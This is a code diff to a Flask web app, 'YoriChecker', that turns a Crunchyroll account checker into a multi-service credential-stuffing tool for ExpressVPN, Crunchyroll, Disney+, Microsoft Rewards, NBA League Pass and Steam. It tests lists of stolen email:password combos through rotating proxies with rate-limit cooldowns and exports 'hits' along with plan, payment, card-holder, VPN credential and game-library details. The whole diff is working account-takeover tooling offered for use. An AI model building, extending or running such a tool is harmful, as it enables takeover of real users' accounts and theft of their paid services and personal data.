@@ -7,64 +7,12 @@ import threading
 import requests
 from flask import Flask, request, render_template_string, send_file, Response
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from checker import CrunchyrollChecker
+import checker
 
 app = Flask(__name__)
 
 tasks = {}
 task_lock = threading.Lock()
-
-class SmartProxyManager:
-    def __init__(self, proxies):
-        self.active = list(proxies)
-        self.cooldown = {}
-        self.lock = threading.Lock()
-        self.empty = len(proxies) == 0
-
-    def get_proxy(self):
-        if self.empty:
-            return None
-            
-        wait_time = 0
-        while wait_time < 30:
-            with self.lock:
-                if self.active:
-                    return self.active.pop(0)
-                
-                now = time.time()
-                resurrected = [p for p, t in self.cooldown.items() if t <= now]
-                for p in resurrected:
-                    self.active.append(p)
-                    del self.cooldown[p]
-                    
-                if self.active:
-                    return self.active.pop(0)
-            
-            time.sleep(1)
-            wait_time += 1
-            
-        return None
-
-    def report_success(self, proxy):
-        if not proxy: return
-        with self.lock:
-            if proxy not in self.active:
-                self.active.append(proxy)
-
-    def report_rate(self, proxy, cooldown_seconds=60):
-        if not proxy: return
-        with self.lock:
-            if proxy in self.active:
-                self.active.remove(proxy)
-            self.cooldown[proxy] = time.time() + cooldown_seconds
-
-    def report_dead(self, proxy):
-        if not proxy: return
-        with self.lock:
-            if proxy in self.active:
-                self.active.remove(proxy)
-            if proxy in self.cooldown:
-                del self.cooldown[proxy]
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -72,13 +20,11 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YoriChecker // Crunchyroll</title>
+    <title>YoriChecker // Unified</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
         
-        * {
-            box-sizing: border-box;
-        }
+        * { box-sizing: border-box; }
 
         body {
             background: #111;
@@ -87,8 +33,15 @@ HTML_TEMPLATE = """
             margin: 0;
             padding: 20px;
             min-height: 100vh;
+            perspective: 1000px;
         }
-        .container { max-width: 1100px; margin: 0 auto; width: 100%; }
+        .container { 
+            max-width: 1100px; 
+            margin: 0 auto; 
+            width: 100%;
+            transition: transform 0.1s ease-out;
+            transform-style: preserve-3d;
+        }
         
         .site-header {
             display: flex;
@@ -154,6 +107,34 @@ HTML_TEMPLATE = """
             transition: color 0.2s;
         }
         .made-by:hover { color: #00ffaa; }
+
+        .service-select {
+            width: 100%;
+            padding: 15px;
+            background: #222;
+            color: #00ffaa;
+            border: 3px solid #444;
+            box-shadow: 8px 8px 0px #000;
+            font-family: 'Space Mono', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            cursor: pointer;
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg fill="%2300ffaa" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 15px top 50%;
+        }
+        .service-desc {
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 20px;
+            padding: 10px;
+            background: #1a1a1a;
+            border-left: 3px solid #ff5500;
+        }
 
         .panels { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .panel {
@@ -263,7 +244,7 @@ HTML_TEMPLATE = """
         }
 
         @media (max-width: 600px) {
-            body { padding: 10px; }
+            body { padding: 10px; perspective: none; }
             .site-header { flex-direction: column; align-items: flex-start; gap: 15px; }
             .header-right { width: 100%; align-items: flex-start; flex-direction: row; justify-content: space-between; }
             h1 { font-size: 22px; }
@@ -272,11 +253,12 @@ HTML_TEMPLATE = """
             .panel { box-shadow: 6px 6px 0px #000; min-width: 100%; }
             #logArea { box-shadow: 6px 6px 0px #000; height: 250px; font-size: 12px; }
             .btn-small { box-shadow: 4px 4px 0px #000; }
+            .container { transform: none !important; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="mainContainer">
         <header class="site-header">
             <div class="header-left">
                 <img src="/logo.png" alt="YoriChecker Logo" class="site-logo" onerror="this.style.display='none'">
@@ -288,11 +270,21 @@ HTML_TEMPLATE = """
             </div>
         </header>
         
+        <select id="service" class="service-select" onchange="updateDesc()">
+            <option value="expressvpn">🌐 ExpressVPN</option>
+            <option value="crunchyroll" selected>🍿 Crunchyroll</option>
+            <option value="disney">🏰 Disney+</option>
+            <option value="microsoft">🎮 Microsoft Rewards</option>
+            <option value="nba">🏀 NBA League Pass</option>
+            <option value="steam">🎮 Steam</option>
+        </select>
+        <div class="service-desc" id="serviceDesc">Checks Crunchyroll accounts using email:pass combos.</div>
+
         <div class="panels">
             <div class="panel">
-                <h3>Combos</h3>
-                <textarea id="combos_text" placeholder="email:pass"></textarea>
-                <input type="file" id="combos_file" accept=".txt" onchange="loadFile(this, 'combos_text')">
+                <h3>Accounts (email:pass)</h3>
+                <textarea id="accounts_text" placeholder="email:pass"></textarea>
+                <input type="file" id="accounts_file" accept=".txt" onchange="loadFile(this, 'accounts_text')">
             </div>
             <div class="panel">
                 <h3>Proxies</h3>
@@ -311,8 +303,22 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
+        const descMap = {
+            'expressvpn': 'Checks ExpressVPN accounts using email:pass combos. Returns plan, expiry, OVPN/PPTP creds.',
+            'crunchyroll': 'Checks Crunchyroll accounts using email:pass combos. Returns plan, streams, country, expiry.',
+            'disney': 'Checks Disney+ accounts using email:pass combos. Returns plan, status, profiles, Hulu status.',
+            'microsoft': 'Checks Microsoft Rewards accounts using email:pass. Returns balance, subscriptions, points.',
+            'nba': 'Checks NBA League Pass accounts using email:pass. Returns display name, expiry, country.',
+            'steam': 'Checks Steam accounts using email:pass. Returns games, level, VAC bans, notable titles.'
+        };
+
+        function updateDesc() {
+            const svc = document.getElementById('service').value;
+            document.getElementById('serviceDesc').textContent = descMap[svc] || '';
+        }
+
         let workingProxies = [];
-        let combosLoaded = false;
+        let accountsLoaded = false;
         let proxiesValidated = false;
 
         function loadFile(input, textareaId) {
@@ -328,11 +334,11 @@ HTML_TEMPLATE = """
         }
 
         function updateStartButton() {
-            combosLoaded = document.getElementById('combos_text').value.trim().length > 0;
-            document.getElementById('startBtn').disabled = !(combosLoaded && proxiesValidated);
+            accountsLoaded = document.getElementById('accounts_text').value.trim().length > 0;
+            document.getElementById('startBtn').disabled = !(accountsLoaded && proxiesValidated);
         }
 
-        document.getElementById('combos_text').addEventListener('input', updateStartButton);
+        document.getElementById('accounts_text').addEventListener('input', updateStartButton);
 
         async function processStream(url, payload, onMessage) {
             const response = await fetch(url, {
@@ -393,13 +399,15 @@ HTML_TEMPLATE = """
         }
 
         async function startChecking() {
-            const fullCombos = document.getElementById('combos_text').value;
+            const fullAccounts = document.getElementById('accounts_text').value;
+            const service = document.getElementById('service').value;
             
             document.getElementById('startBtn').disabled = true;
-            document.getElementById('startBtn').textContent = 'CHECKING...';
+            document.getElementById('startBtn').textContent = 'PROCESSING...';
+            document.getElementById('service').disabled = true;
             document.getElementById('logArea').innerHTML = '';
             
-            await processStream('/check', {combos: fullCombos, working_proxies: workingProxies}, (data) => {
+            await processStream('/check', {service: service, accounts: fullAccounts, working_proxies: workingProxies}, (data) => {
                 if (data.log) {
                     document.getElementById('logArea').innerHTML += data.log + '\\n';
                     document.getElementById('logArea').scrollTop = document.getElementById('logArea').scrollHeight;
@@ -410,7 +418,23 @@ HTML_TEMPLATE = """
                     };
                     document.getElementById('startBtn').textContent = 'START CHECKING';
                     document.getElementById('startBtn').disabled = false;
+                    document.getElementById('service').disabled = false;
                 }
+            });
+        }
+
+        // 3D Tilt Effect
+        const container = document.getElementById('mainContainer');
+        if (window.innerWidth > 600) {
+            document.addEventListener('mousemove', (e) => {
+                const x = (window.innerWidth / 2 - e.pageX) / 80;
+                const y = (window.innerHeight / 2 - e.pageY) / 80;
+                const tiltX = Math.max(-5, Math.min(5, y));
+                const tiltY = Math.max(-5, Math.min(5, -x));
+                container.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
+            });
+            document.addEventListener('mouseleave', () => {
+                container.style.transform = 'rotateX(0) rotateY(0)';
             });
         }
     </script>
@@ -459,20 +483,21 @@ def validate_proxies():
 @app.route('/check', methods=['POST'])
 def check():
     data = request.json
-    combos_raw = data.get('combos', '')
+    service = data.get('service', 'crunchyroll')
+    accounts_raw = data.get('accounts', '')
     working_proxies = data.get('working_proxies', [])
     
-    combos = []
-    for line in combos_raw.splitlines():
+    entries = []
+    for line in accounts_raw.splitlines():
         line = line.strip()
         if ':' in line:
             parts = line.split(':', 1)
             if len(parts) == 2 and parts[0] and parts[1]:
-                combos.append((parts[0], parts[1]))
+                entries.append((parts[0], parts[1]))
                 
     task_id = str(uuid.uuid4())
     
-    proxy_manager = SmartProxyManager(working_proxies)
+    proxy_manager = checker.SmartProxyManager(working_proxies)
     results = []
     results_lock = threading.Lock()
     logs = []
@@ -483,8 +508,19 @@ def check():
             ts = time.strftime("%H:%M:%S")
             logs.append(f"[{ts}] {msg}")
 
-    def check_combo(email, password):
-        max_attempts = 5
+    checker_map = {
+        'expressvpn': checker.ExpressVPNChecker,
+        'crunchyroll': checker.CrunchyrollChecker,
+        'disney': checker.DisneyChecker,
+        'microsoft': checker.MicrosoftRewardsChecker,
+        'nba': checker.NBAChecker,
+        'steam': checker.SteamChecker
+    }
+    
+    CheckerClass = checker_map.get(service, checker.CrunchyrollChecker)
+
+    def check_entry(email, password):
+        max_attempts = 3
         attempts = 0
         
         while attempts < max_attempts:
@@ -497,24 +533,23 @@ def check():
                 def get_proxy(self): return self.p
                 def mark_bad(self): pass
             
-            checker = CrunchyrollChecker(SingleProxyMgr(proxy) if proxy else None)
-            res = checker.check_account(email, password)
-            status = res.get('status')
+            mgr = SingleProxyMgr(proxy) if proxy else None
+            chk = CheckerClass(mgr)
+            res = chk.check_account(email, password)
+            status = res.get('status', 'ERROR')
             
             if status == 'HIT':
                 proxy_manager.report_success(proxy)
                 log(f"{email} -> HIT!")
                 return res
-                
-            elif status in ['INVALID', 'FREE']:
+            elif status in ('INVALID', 'FREE', 'DEAD', 'BAD', 'EXPIRED', 'UNKNOWN', '2FA', 'BANNED', 'RESET'):
                 proxy_manager.report_success(proxy)
                 log(f"{email} -> BAD ({status})")
                 res['status'] = 'BAD'
                 res['error'] = status
                 return res
-                
             else:
-                proxy_manager.report_rate(proxy, cooldown_seconds=60)
+                proxy_manager.report_rate(proxy, 60)
                 log(f"Proxy {proxy or 'DIRECT'} hit RATE/ERROR ({status}). Cooldown 60s.")
                 attempts += 1
                 time.sleep(2)
@@ -524,14 +559,14 @@ def check():
 
     def run():
         with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(check_combo, e, p): (e, p) for e, p in combos}
+            futures = {executor.submit(check_entry, e, p): (e, p) for e, p in entries}
             for future in as_completed(futures):
                 res = future.result()
                 with results_lock:
-                    results.append(res)
+                    results.append((futures[future], res))
         
         with task_lock:
-            tasks[task_id] = results
+            tasks[task_id] = (service, results)
 
     threading.Thread(target=run).start()
     
@@ -557,26 +592,46 @@ def check():
 @app.route('/download/<task_id>')
 def download(task_id):
     with task_lock:
-        task_results = tasks.get(task_id, [])
+        task_data = tasks.get(task_id, (None, []))
+        service, task_results = task_data
         
     hits = []
     bads = []
     rates = []
 
-    for res in task_results:
-        e = res.get('email', '')
-        p = res.get('password', '')
+    def format_hit_line(svc, entry, res):
+        d = res.get('data', res)
+        identifier = f"{entry[0]}:{entry[1]}"
+
+        if svc == 'expressvpn':
+            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expire_date', 'N/A')} ({d.get('days_left', 0)}d) | Auto: {d.get('auto_renew', 'N/A')} | Pay: {d.get('payment_method', 'N/A')} | Lic: {d.get('license', 'N/A')} | OVPN: {d.get('ovpn_user', '')}:{d.get('ovpn_pass', '')} | PPTP: {d.get('pptp_user', '')}:{d.get('pptp_pass', '')}"
+        elif svc == 'crunchyroll':
+            return f"{identifier} | User: {d.get('user', 'N/A')} | Plan: {d.get('plan', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Renew: {d.get('renew', 'N/A')} | CC: {d.get('country', 'N/A')} | Pay: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}"
+        elif svc == 'disney':
+            profiles = ', '.join(d.get('profiles', []))
+            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Status: {d.get('subscriber_status', 'N/A')} | CC: {d.get('country', 'N/A')} | Billing: {d.get('billing_cycle', 'N/A')} | Pay: {d.get('payment_provider', 'N/A')} | Expiry: {d.get('expiry', 'N/A')} ({d.get('remaining_days', 'N/A')}d) | Trial: {d.get('free_trial', 'N/A')} | Ver: {d.get('email_verified', 'N/A')} | Hulu: {d.get('hulu', 'N/A')} | Profiles: {profiles}"
+        elif svc == 'microsoft':
+            return f"{identifier} | CC: {d.get('country', 'N/A')} | Holder: {d.get('card_holder', 'N/A')} | Bal: {d.get('balance', 'N/A')} | Subs: {d.get('purchased_items', 'N/A')} | Auto: {d.get('auto_renew', 'N/A')} | Start: {d.get('start_date', 'N/A')} | Renew: {d.get('renewal_date', 'N/A')} | Pts: {d.get('points', 'N/A')}"
+        elif svc == 'nba':
+            return f"{identifier} | Name: {d.get('displayname', 'N/A')} | Expiry: {d.get('end_date', 'N/A')} | CC: {d.get('country', 'N/A')} | Renew: {d.get('renewal', 'N/A')}"
+        elif svc == 'steam':
+            notable = ', '.join([g['name'] for g in d.get('notable', [])])
+            top10 = ', '.join([f"{g['name']}({g['playtime']}m)" for g in d.get('games_list', [])[:10]])
+            return f"{identifier} | Persona: {d.get('persona', 'N/A')} | ID: {d.get('steamid', 'N/A')} | CC: {d.get('country', 'N/A')} | Lvl: {d.get('level', 'N/A')} | Games: {d.get('game_count', 'N/A')} | VAC: {d.get('vac_bans', 0)} | Trade: {d.get('trade_ban', 'N/A')} | Lim: {d.get('limited', 'N/A')} | Notable: {notable} | Top10: {top10}"
+        return f"{identifier} | HIT"
+
+    for entry, res in task_results:
         status = res.get('status')
+        identifier = f"{entry[0]}:{entry[1]}"
         
         if status == 'HIT':
-            d = res.get('data', {})
-            hits.append(f"{e}:{p} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Country: {d.get('country', 'N/A')} | Auto-Renew: {d.get('renew', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Payment: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}")
+            hits.append(format_hit_line(service, entry, res))
         elif status == 'BAD':
-            reason = res.get('error', 'Invalid or Free')
-            bads.append(f"{e}:{p} | {reason}")
+            err = res.get('error') or res.get('reason') or 'Bad / Invalid / Free'
+            bads.append(f"{identifier} | {err}")
         else:
-            reason = res.get('error', 'Rate limit / Network Error')
-            rates.append(f"{e}:{p} | {reason}")
+            err = res.get('error') or res.get('reason') or 'Rate limit / Network Error'
+            rates.append(f"{identifier} | {err}")
 
     sep = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     output = []
@@ -585,7 +640,7 @@ def download(task_id):
     output.append(sep)
     output.extend(hits)
     output.append("\n" + sep)
-    output.append("BAD (Invalid / Free)")
+    output.append("BAD (Invalid / Free / Dead)")
     output.append(sep)
     output.extend(bads)
     output.append("\n" + sep)
@@ -597,7 +652,7 @@ def download(task_id):
     output.append(sep)
 
     mem = io.BytesIO(("\n".join(output)).encode('utf-8'))
-    return send_file(mem, as_attachment=True, download_name='YoriChecker.txt', mimetype='text/plain')
+    return send_file(mem, as_attachment=True, download_name=f'YoriChecker_{service}.txt', mimetype='text/plain')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
